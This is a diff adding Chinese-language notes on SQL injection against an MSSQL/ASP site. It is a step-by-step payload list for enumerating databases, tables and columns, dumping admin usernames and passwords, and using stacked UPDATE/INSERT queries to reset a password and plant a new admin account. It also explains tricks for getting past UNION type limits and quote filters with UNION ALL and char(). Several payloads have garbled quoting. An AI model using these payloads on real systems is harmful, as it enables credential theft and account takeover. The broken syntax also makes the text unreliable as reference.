@@ -1,0 +1,58 @@
+爆库:
+http://duck/index.asp.id=10 UNION SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA.--
+SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA.
+爆下一个库:
+http://duck/index.asp.id=10 UNION SELECT TOP 1 SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA WHERE TABLE_NAME NOT IN ('库名')--
+
+爆表:
+http://duck/index.asp.id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES--
+
+SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES.
+
+爆下一个表
+http://duck/index.asp.id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME NOT IN ('table1')--
+
+http://duck/index.asp.id=10 UNION SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_NAME LIKE '%login%'--
+
+
+
+爆字段:
+http://duck/index.asp.id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login'--
+
+爆下一个字段
+http://duck/index.asp.id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id')--
+
+http://duck/index.asp.id=10 UNION SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='admin_login' WHERE COLUMN_NAME NOT IN ('login_id','login_name','password',details')--
+
+
+爆字段里的内容
+http://duck/index.asp.id=10 UNION SELECT TOP 1 login_name FROM admin_login--
+
+http://duck/index.asp.id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='neo'--
+
+http://duck/index.asp.id=10 UNION SELECT TOP 1 password FROM admin_login where login_name='trinity'--
+
+http://duck/index.asp.id=10 UNION SELECT TOP 1 convert(int,password.morpheus.) FROM admin_login where login_name='trinity'--
+
+更新字段里的内容
+http://duck/index.asp.id=10; UPDATE .admin_login. SET .password. = .newpas5. WHERE login_name='neo'--
+
+http://duck/index.asp.id=10; INSERT INTO .admin_login. (.login_id.,.login_name.,.password.,.details.) VALUES (666,.neo2.,.newpas5.,.NA.)--
+
+
+
+        在注射的时候，access和mysql环境下，我们通常是通过union来获取数据的。但是遇到mssql环境，union很多时候都行不通，如果页面不报错，openrowset不可用，往往时候就只有暴力了。这样多不好，大家都是文明人，怎么可以用这么野蛮的手段呢？研究了一下，mssql中的union选择主要有以下几个方面的限制。
+    第一个是varchar/nvarchar和int类型的字段union到一起会强制转换出错。这个可以去看superhei大牛N久以前的文章，用and 1=2 把union前面的结果集置空就可以解决了。
+    第二个是当前面语句选择的字段有text、ntext 或者image格式的时候，不能用DISTINCT 方式来选择，而带union的语句必然是以DISTINCT 方式来选择的。这也是为什么很多搜索型的注射点可以用union猜解的原因，因为搜索点的语句很少会选到前面三种格式的字段。Image是二进制格式，一般不会出现在需要回显的sql语句中。这种限制前段时间也看到牛淫给出了解决方法，union后面跟一个all，即union all就搞定了。真是神奇啊，牛淫就是牛淫。
+    最后还有一个限制是text/ntext 与 int类型的字段 union到一起时并不兼容，会报操作数类型冲突的错误，就算用1=2把union前面语句的结果置空也一样。前几天突然想到，union的时候我们经常用1,2,3……之类的常数来补齐相差的列数。这时候后面的语句选择的都是int类型的字段，遇到前面有text/ntext的字段当然会出错，如果加上引号呢，即'1’,'2’,'3’……的形式？这时候后面的字段都是char或者varchar的类型了，应该就不会出错了。如果注射点过滤了引号怎么办？因为mssql对16进制格式的支持不是太好，很多地方用16进制必须declare――set，那就用char吧，即and 1=2 union all select char(49),char(50)……的形式。
+
+突了了大部份限制的语句
+and 1=2 union all select char(49),char(50),null,null;--
+
+
+null也可以正常执行，不过没有回显，不好判断回显的列数。
+一般union遇到问题都是有text或者ntext字段，image的很少遇到
+
+可以先null完之后再一个个用1,2,3,4代替，这样就能逼出image类型的列鸟
+
+
